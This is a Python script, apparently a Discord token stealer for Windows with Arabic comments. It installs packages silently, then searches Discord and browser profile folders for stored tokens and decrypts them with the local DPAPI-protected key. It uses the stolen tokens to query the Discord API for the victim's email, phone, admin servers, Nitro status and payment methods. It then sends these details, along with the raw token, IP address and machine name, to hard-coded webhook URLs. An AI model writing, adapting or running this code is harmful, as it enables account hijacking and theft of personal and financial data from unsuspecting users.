import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

# تعريف رابطين ويب هوك هنا
WEBHOOKS = [
    "https://discord.com/api/webhooks/1552310838616920066/_TLhmaa4vYaUsbxnii7j-8huIFfCO7KRiKSmuwaZUnJma_dvLCZQk_ahAzbeTv66Erx8",
    "https://discord.com/api/webhooks/1552310838616920066/_TLhmaa4vYaUsbxnii7j-8huIFfCO7KRiKSmuwaZUnJma_dvLCZQk_ahAzbeTv66Erx8"  # ضع رابط الويب هوك الثاني هنا
]

def send_to_webhooks(data):
    """إرسال البيانات إلى جميع روابط الويب هوك"""
    success_count = 0
    for webhook_url in WEBHOOKS:
        try:
            request = urllib.request.Request(
                webhook_url,
                data=json.dumps(data).encode('utf-8'),
                headers=getheaders(),
                method='POST'
            )
            response = urllib.request.urlopen(request)
            if response.getcode() == 200:
                success_count += 1
                print(f"[+] تم الإرسال بنجاح إلى الويب هوك {WEBHOOKS.index(webhook_url) + 1}")
            else:
                print(f"[-] فشل الإرسال إلى الويب هوك {WEBHOOKS.index(webhook_url) + 1}: {response.getcode()}")
        except Exception as e:
            print(f"[-] خطأ في الإرسال إلى الويب هوك {WEBHOOKS.index(webhook_url) + 1}: {str(e)[:100]}")
    return success_count

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    checked = []
    total_tokens_found = 0
    total_webhooks_sent = 0

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                # فك تشفير التوكن
                decrypted_token = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
                    AES.MODE_GCM,
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                
                if decrypted_token in checked:
                    continue
                checked.append(decrypted_token)
                total_tokens_found += 1

                # التحقق من صحة التوكن
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(decrypted_token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                # جمع الباجات (الأوسمة)
                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                # جمع معلومات الخوادم
                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(decrypted_token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(decrypted_token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                # جمع معلومات الـ Nitro
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(decrypted_token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                # جمع معلومات الـ Boosts
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(decrypted_token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                # جمع معلومات الدفع
                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(decrypted_token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                # تنسيق الرسالة
                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                
                # إنشاء محتوى الرسالة
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**تم العثور على بيانات جديدة: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nمعرف المستخدم: {res_json['id']}\nالبريد الإلكتروني: {res_json['email']}\nرقم الهاتف: {res_json['phone']}\n\nعدد الخوادم: {guilds}\nصلاحيات الأدمن: {guild_infos}\n``` ```yaml\nتفعيل التحقق بخطوتين: {res_json['mfa_enabled']}\nالأوسمة: {flags}\nاللغة: {res_json['locale']}\nحساب موثق: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nعنوان IP: {getip()}\nاسم المستخدم: {os.getenv("UserName")}\nاسم الجهاز: {os.getenv("COMPUTERNAME")}\nموقع التوكن: {platform}\n```التوكن: \n```yaml\n{decrypted_token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/astraadev"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            },
                            'timestamp': datetime.datetime.now().isoformat()
                        }
                    ],
                    "username": "الحاج",
                    "avatar_url": "https://avatars.githubusercontent.com/u/247693302?v=4"
                }

                # إرسال البيانات إلى رابطين ويب هوك
                sent_count = send_to_webhooks(embed_user)
                total_webhooks_sent += sent_count
                
                if sent_count > 0:
                    print(f"[✓] تم إرسال بيانات {res_json['username']} إلى {sent_count}/{len(WEBHOOKS)} من الويب هوكات")
                else:
                    print(f"[✗] فشل إرسال بيانات {res_json['username']}")

            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"[!] خطأ: {str(e)[:100]}")
                continue

    # ملخص النتائج
    print(f"\n{'='*50}")
    print(f"ملخص العملية:")
    print(f"عدد التوكنات التي تم العثور عليها: {total_tokens_found}")
    print(f"عدد التوكنات التي تم التحقق منها: {len(checked)}")
    print(f"عدد الإرسالات الناجحة: {total_webhooks_sent}")
    print(f"{'='*50}")

if __name__ == "__main__":
    main()
